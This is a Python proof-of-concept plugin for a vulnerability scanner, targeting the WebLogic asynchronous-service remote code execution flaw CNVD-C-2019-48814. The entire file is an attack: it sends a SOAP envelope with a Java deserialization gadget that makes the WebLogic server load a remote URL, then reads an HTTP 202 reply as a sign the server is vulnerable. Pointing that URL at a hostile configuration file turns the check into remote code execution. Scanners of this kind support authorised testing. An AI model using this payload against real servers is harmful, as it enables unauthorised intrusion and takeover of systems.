#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'CNVD-C-2019-48814'
        self.keyword = ['weblogic']
        self.info = 'CNVD-C-2019-48814'
        self.type = 'rce'
        self.level = 'high'
        self.refer = 'http://www.cnvd.org.cn/webinfo/show/4999'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            poc = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
    <void><string>http://www.baidu.com/</string></void>
    </class></java>
    </work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
            '''
            url = self.base_url + '_async/AsyncResponseService'
            headers = {"Content-Type": "text/xml"}
            try:
                res = self.curl('post', url, headers=headers, data=poc, timeout=8)
                if res and res.status_code == 202:
                    self.flag = 1
                    self.req.append({"page": '/_async/AsyncResponseServiceHttps'})
                    self.res.append({"info": url, "key": url})
                    return
            except:
                pass
